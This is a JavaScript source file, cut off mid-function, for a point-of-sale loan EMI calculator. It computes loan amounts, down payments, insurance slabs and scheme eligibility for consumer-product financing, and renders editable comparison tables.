function compMrpChanged() { let mrp = parseFloat(document.getElementById('compMrp').value) || 0; document.getElementById('compInv').value = mrp; let gtl = mrp > 100000 ? 2398 : (mrp > 50000 ? 1799 : (mrp > 30000 ? 1499 : (mrp > 10000 ? 1199 : (mrp > 0 ? 699 : 0)))); document.getElementById('compGtl').value = gtl; let rfcSlab = getRfcSlabValue(mrp); let rfcOpt = document.getElementById('compRfcOpt'); if(rfcOpt) { rfcOpt.value = rfcSlab; rfcOpt.innerText = rfcSlab; } if (isMobileDeviceCat(currentModalCategory)) { document.getElementById('compRfc').value = rfcSlab; } else { document.getElementById('compRfc').value = "0"; } }

function showComponentsModal(baseMrp = "") {
    let c = customerQueue[activeCustomerIndex]; let rfcSelect = document.getElementById('compRfc'); let exwInput = document.getElementById('compExw'); let isMobileCat = isMobileDeviceCat(currentModalCategory);
    if (isMobileCat) { rfcSelect.disabled = false; rfcSelect.style.background = '#fff'; rfcSelect.style.cursor = 'default'; exwInput.disabled = true; exwInput.style.background = '#e9ecef'; exwInput.style.cursor = 'not-allowed'; exwInput.value = ""; } else { rfcSelect.disabled = true; rfcSelect.style.background = '#e9ecef'; rfcSelect.style.cursor = 'not-allowed'; rfcSelect.value = "0"; exwInput.disabled = false; exwInput.style.background = '#fff'; exwInput.style.cursor = 'text'; }
    let currentMrp = baseMrp !== "" ? baseMrp : (c.components?.mrp || ''); document.getElementById('compMrp').value = currentMrp; let mrpForRfc = parseFloat(currentMrp) || 0; let rfcSlab = getRfcSlabValue(mrpForRfc); let rfcOpt = document.getElementById('compRfcOpt'); if(rfcOpt) { rfcOpt.value = rfcSlab; rfcOpt.innerText = rfcSlab; }
    if (baseMrp !== "") { compMrpChanged(); } else { document.getElementById('compInv').value = c.components?.inv || ''; document.getElementById('compGtl').value = c.components?.gtl || 0; if (isMobileCat) { document.getElementById('compRfc').value = c.components?.rfc || 0; } }
    document.getElementById('compCap').value = c.components?.cap || c.cap || ''; document.getElementById('compTarget').value = c.components?.target || ''; if (!isMobileCat) { document.getElementById('compExw').value = c.components?.exw || ''; } document.getElementById('compMargin').value = c.components?.margin || ''; document.getElementById('compDealer').value = c.components?.dealer || ''; document.getElementById('componentsModal').style.display = 'flex';
}

async function proceedToMatrixFromComponents() { let idx = activeCustomerIndex; if(idx === -1) return; if(!customerQueue[idx].components) customerQueue[idx].components = {}; customerQueue[idx].components.mrp = parseFloat(document.getElementById('compMrp').value) || 0; customerQueue[idx].components.inv = parseFloat(document.getElementById('compInv').value) || 0; customerQueue[idx].components.cap = parseFloat(document.getElementById('compCap').value) || 0; customerQueue[idx].components.target = parseFloat(document.getElementById('compTarget').value) || 0; customerQueue[idx].components.gtl = parseFloat(document.getElementById('compGtl').value) || 0; let isMobileCat = isMobileDeviceCat(currentModalCategory); customerQueue[idx].components.rfc = isMobileCat ? (parseFloat(document.getElementById('compRfc').value) || 0) : 0; customerQueue[idx].components.exw = isMobileCat ? 0 : (parseFloat(document.getElementById('compExw').value) || 0); customerQueue[idx].components.margin = parseFloat(document.getElementById('compMargin').value) || 0; customerQueue[idx].components.dealer = parseFloat(document.getElementById('compDealer').value) || 0; let cCap = customerQueue[idx].components.cap; if (cCap > 0 || customerQueue[idx].cap > 0) { customerQueue[idx].cap = cCap > 0 ? cCap : ""; renderCustomerQueue(); updateMatrixTopCard(); } await saveQueueToLocal(); document.getElementById('componentsModal').style.display = 'none'; if (tempPendingProduct) finalizeProductAddition(); }

async function finalizeProductAddition() {
    let raw = tempPendingProduct.isNT ? db_records.filter(r => r.model === SPECIAL_MODEL && r.category === tempPendingProduct.category) : db_records.filter(r => r.model === tempPendingProduct.name); let ltvLimit = customerQueue[activeCustomerIndex]?.ltv || 100; let matrixEligible = raw.filter(s => s.fixedEmi > 0 || (s.tenure > 0 && ((s.tenure-s.advEmi)/s.tenure)*100 <= ltvLimit)); let uniqueSchemes = []; let seenSchemes = new Set();
    matrixEligible.forEach(s => { let schemeKey = `${s.tenure}_${s.advEmi}_${s.fixedEmi}_${s.minLoan}_${s.maxLoan}`; if (!seenSchemes.has(schemeKey)) { seenSchemes.add(schemeKey); s.inactive = false; uniqueSchemes.push(s); } });
    let comp = customerQueue[activeCustomerIndex].components || {}; let finalMrp = comp.mrp || ""; let finalInv = comp.inv || ""; let surch = (finalInv > finalMrp && finalMrp > 0) ? finalInv - finalMrp : 0;
    current_products.push({ name: tempPendingProduct.name, isNonTieup: tempPendingProduct.isNT, schemes: uniqueSchemes, category: tempPendingProduct.category, inputs: { mrp: finalMrp, inv: finalInv, cap: comp.cap || (customerQueue[activeCustomerIndex]?.cap || ""), target: comp.target || "", gtl: comp.gtl || 0, rfc: comp.rfc || 0, exw: comp.exw || 0, margin: comp.margin || "", dealer: comp.dealer || "", surch: surch, manualLoans: {} }, isManual: false }); sortConfigs.push({ key: 'dp', dir: 'asc' }); customerQueue[activeCustomerIndex].products = current_products; customerQueue[activeCustomerIndex].sortConfigs = sortConfigs; tempPendingProduct = null; await saveQueueToLocal(); renderMatrix(); 
}

function updateFinalSwitcher() { let sw = document.getElementById('finalCustomerSwitcher'); if(!sw) return; sw.innerHTML = customerQueue.map((c, i) => `<option value="${i}" ${i === activeCustomerIndex ? 'selected' : ''}>👤 ${c.name} (₹${c.limit})</option>`).join(''); }
async function switchCustomerFinal(idx) { activeCustomerIndex = parseInt(idx); await saveQueueToLocal(); goToFinalPage(); }
function updateMatrixTopCard() { let c = customerQueue[activeCustomerIndex]; document.getElementById('infoName').innerText = c?.name || "-"; document.getElementById('infoMobile').innerText = c?.mobile || ""; document.getElementById('infoLimit').innerText = "₹" + (c?.limit || 0); document.getElementById('infoLtv').innerText = (c?.ltv || 100) + "%"; document.getElementById('infoCap').innerText = c?.cap ? "₹" + c.cap : "NONE"; document.getElementById('infoType').innerText = c?.type || 'NEW'; }
function loadCurrentProducts() { let c = customerQueue[activeCustomerIndex]; current_products = c.products || []; sortConfigs = c.sortConfigs || []; }

function goToFinalPage() {
    if(activeCustomerIndex === -1) return; loadCurrentProducts(); updateMatrixTopCard(); updateFinalSwitcher(); document.getElementById('unifiedHome').style.display = 'none'; document.getElementById('finalEligibleArea').style.display = 'flex'; renderMatrix(); setTimeout(() => { document.getElementById('finalEligibleArea').scrollIntoView({ behavior: 'smooth', block: 'start' }); if(current_products.length === 0) openAddProductModal(); }, 150);
}

function toggleModelView(pIdx) { let wrapper = document.getElementById(`tw_${pIdx}`); let grid = document.getElementById(`cg_${pIdx}`); let icon = document.getElementById(`togIcon_${pIdx}`); if(wrapper.style.display === 'none') { wrapper.style.display = 'block'; if(grid) grid.style.display = 'grid'; icon.innerText = '▼'; } else { wrapper.style.display = 'none'; if(grid) grid.style.display = 'none'; icon.innerText = '▶'; } }
function instantSingleQuote(pIdx) { window.tempImageGenIndices = [pIdx]; requestWhatsAppDispatch = false; doGenerateCustomerImage(); }

function renderMatrix() {
    let container = document.getElementById('multiModelContainer'); container.innerHTML = "";
    current_products.forEach((prod, pIdx) => {
        let div = document.createElement('div'); div.className = 'model-panel'; let isNT = prod.isNonTieup; let isCollapsed = (current_products.length > 1 && pIdx < current_products.length - 1); let displayStyle = isCollapsed ? 'none' : 'block'; let gridStyle = isCollapsed ? 'none' : 'grid'; let toggleIcon = isCollapsed ? '▶' : '▼'; let isPhoneWebMobile = isMobileDeviceCat(prod.category); if (!isPhoneWebMobile) prod.inputs.rfc = 0; if (isPhoneWebMobile) prod.inputs.exw = 0; let mVal = parseFloat(prod.inputs.mrp) || 0; let rfcSlab = getRfcSlabValue(mVal);
        div.innerHTML = `
            <div style="font-weight:900; color:var(--indigo); border-bottom:1px solid #ccc; padding-bottom:4px; margin-bottom:6px; display:flex; justify-content:space-between; align-items:center; flex-wrap:wrap; gap:6px;">
                <div style="display:flex; align-items:center; gap: 8px; flex-wrap:wrap;">
                    <span style="text-transform:uppercase; display:flex; align-items:center;"><span id="togIcon_${pIdx}" onclick="toggleModelView(${pIdx})" style="cursor:pointer; color:var(--primary); padding-right:6px; user-select:none;">${toggleIcon}</span>${prod.name}</span>
                    <div style="display:flex; gap:4px; align-items:center; background:#e3f2fd; padding:4px 8px; border-radius:4px; border:1px solid #0984e3;">
                        <label style="margin:0; color:var(--primary);">MRP:</label> <input type="number" id="mrp_${pIdx}" value="${prod.inputs.mrp}" style="width:60px; padding:4px;" oninput="updateVal(${pIdx},'mrp',this.value)">
                        <label style="margin:0; color:var(--primary);">INV:</label> <input type="number" id="inv_${pIdx}" value="${prod.inputs.inv}" style="width:60px; padding:4px;" oninput="updateVal(${pIdx},'inv',this.value)">
                        <label style="margin:0; color:var(--primary);">VAR:</label> <input type="number" id="surch_${pIdx}" value="${prod.inputs.surch}" style="width:60px; padding:4px; background:#e8e8e8; border:1px dashed #aaa; color:var(--danger); cursor:not-allowed;" readonly>
                    </div>
                </div>
                <div style="display:flex; gap:6px;"><button onclick="instantSingleQuote(${pIdx})" style="background:var(--bajaj-blue); color:white; box-shadow:0 1px 3px rgba(0,0,0,0.2);">🖼️ QUOTE</button><button onclick="document.getElementById('tw_${pIdx}').classList.toggle('show-details-mode')" style="background:var(--warning); color:#000;">👁️ DETAILS</button><button onclick="openSchemeOnlyModal(${pIdx})" style="background:var(--success); color:white;">+ MANUAL</button><button onclick="current_products.splice(${pIdx},1);saveQueueToLocal();renderMatrix();" style="background:var(--danger); color:white;">REMOVE</button></div>
            </div>
            <div class="control-grid" id="cg_${pIdx}" style="display:${gridStyle};">
                <div><label>EMI CAPPING</label><input type="number" id="capInp_${pIdx}" value="${prod.inputs.cap}" placeholder="MAX" oninput="updateVal(${pIdx},'cap',this.value)"></div>
                <div><label>TARGET DP</label><input type="number" value="${prod.inputs.target}" placeholder="0" oninput="updateVal(${pIdx},'target',this.value)"></div>
                <div><label>GTL</label><select id="gtl_${pIdx}" onchange="updateVal(${pIdx},'gtl',this.value)"><option value="0" ${prod.inputs.gtl == 0 ? 'selected' : ''}>0</option><option value="699" ${prod.inputs.gtl == 699 ? 'selected' : ''}>699</option><option value="1099" ${prod.inputs.gtl == 1099 ? 'selected' : ''}>1099</option><option value="1199" ${prod.inputs.gtl == 1199 ? 'selected' : ''}>1199</option><option value="1499" ${prod.inputs.gtl == 1499 ? 'selected' : ''}>1499</option><option value="1799" ${prod.inputs.gtl == 1799 ? 'selected' : ''}>1799</option><option value="2398" ${prod.inputs.gtl == 2398 ? 'selected' : ''}>2398</option></select></div>
                <div><label>RFC</label><select id="rfc_${pIdx}" onchange="updateVal(${pIdx},'rfc',this.value)" ${isPhoneWebMobile ? '' : 'disabled style="background:#e9ecef; cursor:not-allowed;"'}><option value="0">0</option>${isPhoneWebMobile ? `<option id="rfc_opt_${pIdx}" value="${rfcSlab}" ${prod.inputs.rfc > 0 ? 'selected' : ''}>${rfcSlab}</option>` : ''}</select></div>
                <div><label>EXW</label><input type="number" id="exw_${pIdx}" value="${prod.inputs.exw}" placeholder="0" oninput="updateVal(${pIdx},'exw',this.value)" ${isPhoneWebMobile ? 'disabled style="background:#e9ecef; cursor:not-allowed;"' : 'style="background:#fff;"'}></div>
                <div><label>MARGIN</label><input type="number" value="${prod.inputs.margin}" placeholder="0" oninput="updateVal(${pIdx},'margin',this.value)"></div>
                <div><label>DEALER</label><input type="number" value="${prod.inputs.dealer}" placeholder="0" oninput="updateVal(${pIdx},'dealer',this.value)"></div>
            </div>
            <div class="table-wrapper" id="tw_${pIdx}" style="display:${displayStyle};">
                <table>
                    <thead>
                        <tr><th class="hidden-col" onclick="sortM(${pIdx},'category')">CAT ↕</th><th class="hidden-col" onclick="sortM(${pIdx},'dbd')">DBD% ↕</th><th class="hidden-col" onclick="sortM(${pIdx},'pf')">PF ↕</th><th class="hidden-col" onclick="sortM(${pIdx},'roi')">ROI% ↕</th><th class="hidden-col" onclick="sortM(${pIdx},'fixedEmi')">FIXED ↕</th><th class="hidden-col" onclick="sortM(${pIdx},'curLTV')">LTV% ↕</th><th class="hidden-col" onclick="sortM(${pIdx},'netDisb')" style="color:var(--bajaj-blue);">NET DISB ↕</th><th class="hidden-col" onclick="sortM(${pIdx},'extra')">EXTRA ↕</th>${isNT ? `<th onclick="sortM(${pIdx},'minLoan')">MIN ↕</th><th onclick="sortM(${pIdx},'maxLoan')">MAX ↕</th>` : `<th onclick="sortM(${pIdx},'nbfcMaxL')">NBFC LMT ↕</th>`}<th onclick="sortM(${pIdx},'loan')">LOAN ↕</th><th onclick="sortM(${pIdx},'currentTenure')">T/A ↕</th><th onclick="sortM(${pIdx},'dp')">NET DP ↕</th><th onclick="sortM(${pIdx},'emi')">EMI ↕</th><th onclick="sortM(${pIdx},'inst')">M ↕</th><th onclick="sortM(${pIdx},'daily')">DAILY ↕</th><th>ACT</th></tr>
                    </thead>
                    <tbody id="body_${pIdx}"></tbody>
                </table>
            </div>`;
        container.appendChild(div); recalcModel(pIdx);
    });
}

function syncInsurance(pIdx, mrpVal, baseLoanVal, triggerType = 'NONE') {
    let prod = current_products[pIdx]; let isPhoneWebMobile = isMobileDeviceCat(prod.category); let gtl = baseLoanVal > 100000 ? 2398 : (baseLoanVal > 50000 ? 1799 : (baseLoanVal > 30000 ? 1499 : (baseLoanVal > 10000 ? 1199 : (baseLoanVal > 0 ? 699 : 0)))); let rfcSlab = getRfcSlabValue(mrpVal); let inp = prod.inputs;
    if(triggerType === 'MRP' || triggerType === 'INV') { inp.gtl = gtl; if(triggerType === 'MRP') inp.rfc = isPhoneWebMobile ? rfcSlab : 0; } else if (triggerType === 'LOAN') { inp.gtl = gtl; }
    let gSelect = document.getElementById(`gtl_${pIdx}`); let rOpt = document.getElementById(`rfc_opt_${pIdx}`); let rSelect = document.getElementById(`rfc_${pIdx}`); let exwInput = document.getElementById(`exw_${pIdx}`);
    if(gSelect) gSelect.value = inp.gtl; if(rOpt && isPhoneWebMobile) { rOpt.value = rfcSlab; rOpt.innerText = rfcSlab; } if(rSelect) { if(isPhoneWebMobile) { rSelect.value = inp.rfc; } else { rSelect.value = "0"; inp.rfc = 0; } } if(exwInput) { if(isPhoneWebMobile) { exwInput.value = ""; inp.exw = 0; } }
}

function updateVal(pIdx, field, val) {
    let v = val === "" ? "" : parseFloat(val) || 0; current_products[pIdx].inputs[field] = v;
    if (field === 'mrp' || field === 'inv' || field === 'target' || field === 'cap') {
        current_products[pIdx].inputs.manualLoans = {};
    }
    if(field === 'cap') { if(activeCustomerIndex !== -1 && customerQueue[activeCustomerIndex]) { customerQueue[activeCustomerIndex].cap = v === 0 ? "" : v; let topCap = document.getElementById('infoCap'); if(topCap) topCap.innerText = v > 0 ? "₹" + v : "NONE"; current_products.forEach((cp, idx) => { cp.inputs.cap = v; let capInput = document.getElementById(`capInp_${idx}`); if (capInput && idx !== pIdx) capInput.value = val; }); } }
    if (field === 'mrp' || field === 'inv') { let m = parseFloat(current_products[pIdx].inputs.mrp) || 0; let i = parseFloat(current_products[pIdx].inputs.inv) || 0; current_products[pIdx].inputs.surch = (i > m && m > 0) ? i - m : 0; let surchEl = document.getElementById(`surch_${pIdx}`); if(surchEl) surchEl.value = current_products[pIdx].inputs.surch; if(field === 'mrp' && i === 0) syncInsurance(pIdx, m, m, 'MRP'); if(field === 'inv') syncInsurance(pIdx, m, i > 0 ? i : m, 'INV'); }
    field === 'cap' ? current_products.forEach((_, idx) => recalcModel(idx)) : recalcModel(pIdx); customerQueue[activeCustomerIndex].products = current_products; saveQueueToLocal();
}

function recalcModel(pIdx) {
    if(!current_products[pIdx]) return; 

    let today = new Date(); today.setHours(0,0,0,0);
    current_products[pIdx].schemes = current_products[pIdx].schemes.filter(s => {
        if(!s.expiryDateStr) return true;
        let p = s.expiryDateStr.split('/');
        if(p.length !== 3) return true;
        let expD = new Date(p[2], p[1]-1, p[0]);
        return expD >= today;
    });

    let prod = current_products[pIdx], limit = customerQueue[activeCustomerIndex]?.limit || 0, type = customerQueue[activeCustomerIndex]?.type || 'NEW'; let fee = (type === 'EMI CARD') ? 270 : (type === 'W/O CARD' ? 320 : 850), inp = prod.inputs; let totalFees = fee + (parseFloat(inp.margin)||0) + (parseFloat(inp.dealer)||0); let currentLimit = limit > 0 ? limit : 9999999; let inputMrp = parseFloat(inp.mrp) || 0; let inputInv = parseFloat(inp.inv) || 0; let effectivePrice = inputInv > 0 ? inputInv : (inputMrp > 0 ? inputMrp : 0); let loanCapPrice = (inputMrp > 0 && inputInv > 0) ? Math.min(inputMrp, inputInv) : effectivePrice;

    let minAllowedLoanByInvoice = effectivePrice > 0 ? effectivePrice * 0.50 : 0;

    prod.calculatedData = prod.schemes.map((s, dIdx) => {
        let isFixed = s.fixedEmi > 0; let loan = 0, nbfcMaxL = 0, dpExact = 0, dpRounded = 0, emi = 0, inst = 0, currentTenure = s.tenure; nbfcMaxL = (currentLimit * s.tenure) / (s.tenure - s.advEmi || 1); let dbdRate = (s.dbd * 1.18 / 100); let roiRate = s.roi / 1200; let roiRateDP = roiRate * s.advEmi; let dynamicPf = s.pf;
        if (prod.isNonTieup) { let checkAmount = effectivePrice > 0 ? effectivePrice : (currentLimit < 9999999 ? currentLimit : 0); let slabPf = getNonTieupPfValue(prod.category, checkAmount); if (slabPf !== null) { dynamicPf = slabPf; } }
        if (isFixed) {
            let maxRemainingEmis = Math.floor(currentLimit / s.fixedEmi); let maxTotalTenure = maxRemainingEmis + s.advEmi; nbfcMaxL = maxTotalTenure * s.fixedEmi; 
            if (effectivePrice > 0) { currentTenure = Math.floor(effectivePrice / s.fixedEmi); if (currentTenure > maxTotalTenure) currentTenure = maxTotalTenure; if (currentTenure < 1) currentTenure = 1; loan = currentTenure * s.fixedEmi; if (loan > loanCapPrice) loan = loanCapPrice;

            if (parseFloat(inp.target) > 0) { let numerator = parseFloat(inp.target) - effectivePrice - (s.fixedEmi * s.advEmi) - dynamicPf - totalFees; let denominator = dbdRate + roiRateDP - 1; let solvedLoan = numerator / denominator; let solvedTenure = Math.floor(solvedLoan / s.fixedEmi); if (solvedTenure > maxTotalTenure) solvedTenure = maxTotalTenure; loan = Math.max(0, solvedTenure * s.fixedEmi); if (loan > loanCapPrice) loan = loanCapPrice; currentTenure = Math.floor(loan / s.fixedEmi) || 1; } } else { currentTenure = s.tenure || 1; if (currentTenure > maxTotalTenure) currentTenure = maxTotalTenure; loan = currentTenure * s.fixedEmi; }
        } else {
            let checkPrice = effectivePrice > 0 ? loanCapPrice : 50000; let absoluteMax = Math.min(checkPrice, nbfcMaxL); if (prod.isNonTieup) { if (s.maxLoan < 9999999) absoluteMax = Math.min(absoluteMax, s.maxLoan); } loan = absoluteMax;

            if(parseFloat(inp.target) > 0 && effectivePrice > 0) { let advRate = s.advEmi / s.tenure; let numerator = parseFloat(inp.target) - effectivePrice - dynamicPf - totalFees; let denominator = advRate + dbdRate + roiRateDP - 1; let solvedLoan = numerator / denominator; loan = Math.min(loan, Math.max(0, Math.floor(solvedLoan))); } 
        }

        let isManuallyOverridden = (inp.manualLoans && inp.manualLoans[dIdx] !== undefined);
        if (isManuallyOverridden) {
            loan = inp.manualLoans[dIdx];
            if (isFixed) currentTenure = Math.floor(loan / s.fixedEmi) || 1;
        }

        if (!isFixed) {
            if (effectivePrice > 0 && loan > effectivePrice) {
                loan = effectivePrice;
            }
        }

        if (isFixed) {
            inst = currentTenure - s.advEmi; if(inst < 1) inst = 1; let insTotal = (parseFloat(inp.gtl)||0) + (parseFloat(inp.rfc)||0) + (parseFloat(inp.exw)||0); let roiInEmi = loan * roiRate; emi = s.fixedEmi + (insTotal / inst) + roiInEmi;
            let roiInDp = loan * roiRateDP; dpExact = effectivePrice - loan + (s.fixedEmi * s.advEmi) + (loan * dbdRate) + dynamicPf + totalFees + roiInDp;
        } else {
            inst = s.tenure - s.advEmi; if(inst < 1) inst = 1; let insTotal = (parseFloat(inp.gtl)||0)+(parseFloat(inp.rfc)||0)+(parseFloat(inp.exw)||0); 
            
            let baseEmi = loan / s.tenure;
            if (baseEmi > 0 && baseEmi < 900) baseEmi = 900; 

            let roiInEmi = loan * roiRate; emi = baseEmi + (insTotal / inst) + roiInEmi;
            if(!isManuallyOverridden && emi > parseFloat(inp.cap) && parseFloat(inp.cap) > 0) { 
                loan = (parseFloat(inp.cap) - (insTotal/inst)) / ( (1/s.tenure) + roiRate ); 
                if (effectivePrice > 0 && loan > effectivePrice) loan = effectivePrice; 
                
                baseEmi = loan / s.tenure;
                if (baseEmi > 0 && baseEmi < 900) baseEmi = 900; 

                roiInEmi = loan * roiRate; emi = baseEmi + (insTotal / inst) + roiInEmi; 
            } 
            let roiInDp = loan * roiRateDP; dpExact = effectivePrice - loan + (baseEmi * s.advEmi) + (loan * dbdRate) + dynamicPf + totalFees + roiInDp;
        }

        if(dpExact > 0) dpRounded = Math.ceil(dpExact / 10) * 10; else dpRounded = dpExact; let extraVal = effectivePrice > 0 ? (((emi * inst) + dpRounded) - effectivePrice) : 0; let dbdAmt = loan * dbdRate; let roiAmt = (loan * roiRateDP) + (loan * roiRate * inst); let curLTV = currentTenure > 0 ? ((currentTenure - s.advEmi) / currentTenure) * 100 : 0; let marginMoney = parseFloat(inp.margin) || 0; let roundupAdj = (dpRounded > dpExact) ? (dpRounded - dpExact) : 0; let netDisb = effectivePrice > 0 ? (effectivePrice - dpRounded - marginMoney - roundupAdj) : 0;

        let isInv50Breach = effectivePrice > 0 && (loan < minAllowedLoanByInvoice);

        return { ...s, pf: dynamicPf, currentTenure, nbfcMaxL, loan, dp: dpRounded, emi, inst, daily: emi/30, dIdx, isFixed, curLTV, extra: extraVal, dbdAmt, roiAmt, netDisb, inactive: s.inactive || false, expiryDateStr: s.expiryDateStr, isInv50Breach: isInv50Breach };
    });
    renderRows(pIdx);
}

function renderRows(pIdx) {
    let prod = current_products[pIdx]; 
    if(!sortConfigs[pIdx]) sortConfigs[pIdx] = {key: 'dp', dir: 'asc'}; 
    let conf = sortConfigs[pIdx]; 
    prod.calculatedData.sort((a,b) => conf.dir==='asc' ? a[conf.key]-b[conf.key] : b[conf.key]-a[conf.key]); 
    let ltvLimit = customerQueue[activeCustomerIndex]?.ltv || 100; 
    let isNT = prod.isNonTieup;

    let today = new Date(); today.setHours(0,0,0,0);

    document.getElementById(`body_${pIdx}`).innerHTML = prod.calculatedData.map(d => {
        if(d.expiryDateStr) {
            let p = d.expiryDateStr.trim().split('/');
            if(p.length === 3) {
                let expD = new Date(p[2], p[1]-1, p[0]);
                if(expD < today) return ''; 
            }
        }

        let curLTV = d.curLTV; let isLtvB = (curLTV > ltvLimit); let isBoundB = false; if (isNT && prod.inputs.mrp > 0) { if (d.loan < d.minLoan || d.loan > d.maxLoan) isBoundB = true; } let isInactive = d.inactive; 

        if (d.isInv50Breach) { isBoundB = true; }

        let rowClass = (d.isFixed ? "fixed-row " : "") + (isLtvB || isBoundB ? "ltv-breach " : "") + (d.isExpired && !isInactive ? "expired-row " : "") + (isInactive ? "inactive-row " : "");
        let toggleBtnHTML = isInactive ? `<button class="action-btn" style="background:var(--success);" onclick="toggleInactive(${pIdx}, ${d.dIdx})">ADD</button>` : `<button class="action-btn" style="background:var(--danger);" onclick="toggleInactive(${pIdx}, ${d.dIdx})">DISABLE</button>`;
        let expInfo = d.expiryDateStr ? `<div style="font-size:10px; color:#555; margin-top:2px; font-weight:bold;">Exp: ${d.expiryDateStr}</div>` : ''; let expiredWarning = d.isExpired ? `<div style="color:#d35400; font-size:9px; font-weight:900; margin-top:3px; line-height:1.2; background:#ffeaa7; padding:2px; border-radius:3px;">⚠️ EXPIRED<br>Check Live</div>` : '';
        return `<tr id="row_${pIdx}_${d.dIdx}" class="${rowClass}">
            <td class="hidden-col">${d.category}</td><td class="hidden-col">${+parseFloat(d.dbd).toFixed(3)}%<br><span style="color:var(--danger); font-weight:900;">₹${Math.round(d.dbdAmt||0).toLocaleString()}</span></td><td class="hidden-col">₹${d.pf}</td><td class="hidden-col">${+parseFloat(d.roi).toFixed(2)}%<br><span style="color:var(--danger); font-weight:900;">₹${Math.round(d.roiAmt||0).toLocaleString()}</span></td><td class="hidden-col">${d.fixedEmi > 0 ? '₹'+d.fixedEmi : 'N/A'}</td><td class="hidden-col" id="ltv_${pIdx}_${d.dIdx}">${Math.round(d.curLTV)}%</td><td class="hidden-col" id="nd_${pIdx}_${d.dIdx}" style="font-weight:900; color:var(--bajaj-blue);">₹${Math.round(d.netDisb).toLocaleString()}</td><td class="hidden-col" id="extra_${pIdx}_${d.dIdx}" style="font-weight:900; color:var(--danger);">₹${Math.round(d.extra).toLocaleString()}</td>
            ${isNT ? `<td class="bound-col">${d.minLoan > 0 ? '₹' + d.minLoan : '0'}</td><td class="bound-col">${d.maxLoan < 9999999 ? '₹' + d.maxLoan : 'NO'}</td>` : `<td style="color:#777;">₹${Math.floor(d.nbfcMaxL)}</td>`}
            <td><div class="stepper"><button class="step-btn" onclick="step(${pIdx},${d.dIdx},-${d.isFixed ? d.fixedEmi : 1000})">-</button><input id="l_${pIdx}_${d.dIdx}" type="number" value="${Math.floor(d.loan)}" class="step-inp" onchange="manual(${pIdx},${d.dIdx})" onblur="manual(${pIdx},${d.dIdx})"><button class="step-btn" onclick="step(${pIdx},${d.dIdx},${d.isFixed ? d.fixedEmi : 1000})">+</button></div></td>
            <td id="ta_${pIdx}_${d.dIdx}" style="font-weight:900;">${d.currentTenure}/${d.advEmi}${expInfo}${expiredWarning}</td>
            <td id="dp_${pIdx}_${d.dIdx}" style="color:var(--success); font-weight:950;">₹${Math.round(d.dp).toLocaleString()}</td><td id="emi_${pIdx}_${d.dIdx}" style="color:var(--primary); font-weight:950;">₹${Math.round(d.emi).toLocaleString()}</td><td id="inst_${pIdx}_${d.dIdx}" style="font-weight:900;">${d.inst}</td><td id="day_${pIdx}_${d.dIdx}" style="color:var(--success); font-weight:950;">₹${Math.round(d.daily).toLocaleString()}</td>
            <td><div style="display:flex; flex-direction:column; gap:2px; min-width: 40px;"><button class="action-btn btn-copy" onclick="copySchemeText(${pIdx}, ${d.dIdx}, this)">COPY</button><button class="action-btn" style="background:var(--warning); color:#000;" onclick="openEditSchemeModal(${pIdx}, ${d.dIdx})">EDIT</button>${toggleBtnHTML}</div></td>
        </tr>`;
    }).join('');
}

function step(pIdx, dIdx, amt) { let el = document.getElementById(`l_${pIdx}_${dIdx}`); el.value = Math.max(0, parseInt(el.value) + amt); manual(pIdx, dIdx); }

function manual(pIdx, dIdx) {
    let el = document.getElementById(`l_${pIdx}_${dIdx}`), loan = parseFloat(el.value) || 0, prod = current_products[pIdx], d = prod.calculatedData.find(x => x.dIdx === dIdx), inp = prod.inputs, type = customerQueue[activeCustomerIndex]?.type || 'NEW';
    let fee = (type === 'EMI CARD') ? 270 : (type === 'W/O CARD' ? 320 : 850); let totalFees = fee + (parseFloat(inp.margin)||0) + (parseFloat(inp.dealer)||0); 
    let ltvLimit = customerQueue[activeCustomerIndex]?.ltv || 100; let limit = customerQueue[activeCustomerIndex]?.limit || 0; 
    let currentLimit = limit > 0 ? limit : 9999999; let inputMrp = parseFloat(inp.mrp) || 0; let inputInv = parseFloat(inp.inv) || 0; 
    let effectivePrice = inputInv > 0 ? inputInv : (inputMrp > 0 ? inputMrp : 0); let loanCapPrice = (inputMrp > 0 && inputInv > 0) ? Math.min(inputMrp, inputInv) : effectivePrice;
    
    let minAllowedLoanByInvoice = effectivePrice > 0 ? effectivePrice * 0.50 : 0;
    if (effectivePrice > 0 && loan < minAllowedLoanByInvoice) {
        loan = minAllowedLoanByInvoice;
        showToast("⚠️ लोन अमाऊंट इन्व्हॉइसच्या ५०% पेक्षा कमी असू शकत नाही!", "error");
    }

    if (effectivePrice > 0 && loan > effectivePrice) {
        loan = effectivePrice;
        showToast("⚠️ लोन इन्व्हॉइसपेक्षा जास्त असू शकत नाही!", "warning");
    }

    syncInsurance(pIdx, inputMrp, loan, 'LOAN'); 
    let appliedPf = d.pf; if (prod.isNonTieup) { let checkAmount = effectivePrice > 0 ? effectivePrice : loan; let slabPf = getNonTieupPfValue(prod.category, checkAmount); if (slabPf !== null) appliedPf = slabPf; d.pf = appliedPf; let pfCell = document.querySelector(`#row_${pIdx}_${dIdx} td:nth-child(3)`); if(pfCell) pfCell.innerText = `₹${appliedPf}`; }
    let dbdRate = (d.dbd * 1.18 / 100); let roiRate = d.roi / 1200; let roiRateDP = roiRate * d.advEmi; let dpE = 0; let dpR = 0;
    
    if (d.isFixed) { 
        let calcTenure = Math.floor(loan / d.fixedEmi) || 1; 
        
        if (effectivePrice > 0 && (calcTenure * d.fixedEmi) < minAllowedLoanByInvoice) {
            calcTenure = Math.ceil(minAllowedLoanByInvoice / d.fixedEmi);
        }
        
        loan = calcTenure * d.fixedEmi; 

        let maxBoundary = Math.min(d.nbfcMaxL, prod.isNonTieup ? d.maxLoan : 9999999, loanCapPrice > 0 ? loanCapPrice : 9999999); 
        if (loan > maxBoundary) { 
            loan = Math.floor(maxBoundary / d.fixedEmi) * d.fixedEmi; 
            calcTenure = Math.floor(loan / d.fixedEmi) || 1; 
        } 
        el.value = loan; 
        
        let roiInEmi = loan * roiRate; let roiInDp = loan * roiRateDP; 
        dpE = effectivePrice - loan + (d.fixedEmi * d.advEmi) + (loan * dbdRate) + appliedPf + totalFees + roiInDp; dpR = Math.ceil(dpE / 10) * 10; 
        let inst = calcTenure - d.advEmi; if(inst < 1) inst = 1; 
        let emi = d.fixedEmi + (((parseFloat(inp.gtl)||0) + (parseFloat(inp.rfc)||0) + (parseFloat(inp.exw)||0)) / inst) + roiInEmi; 
        let expInfo = d.expiryDateStr ? `<div style="font-size:10px; color:#555; margin-top:2px; font-weight:bold;">Exp: ${d.expiryDateStr}</div>` : ''; 
